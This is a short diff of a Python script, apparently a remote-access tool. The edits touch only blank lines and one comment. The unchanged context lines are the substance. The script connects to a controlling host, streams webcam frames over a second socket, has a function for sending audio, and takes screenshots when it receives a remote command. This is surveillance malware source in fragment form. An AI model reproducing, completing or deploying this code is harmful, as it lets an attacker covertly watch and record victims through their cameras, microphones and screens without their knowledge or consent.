@@ -33,8 +33,7 @@ PORT = 8080
 
 
 s.connect((HOST,PORT))
-print("connected")
-
+print("connected")  # for testing
 
 def error_response():
     global s
@@ -45,6 +44,7 @@ def send_image_data():
     time.sleep(2)
     s2.connect((HOST, 8081))
     print("CONNECTED TO 2nd socket ")
+
     while True: 
         cap = cv2.VideoCapture(0)
         ret, frame=cap.read()
@@ -62,6 +62,7 @@ def sending_audio_data():
 
 while True:
     command = s.recv(52).decode("utf-8")
+
     if command == "take_screenshot":
         screen = pyautogui.screenshot()
         screen.save(f"{base}\\screenshot.png")
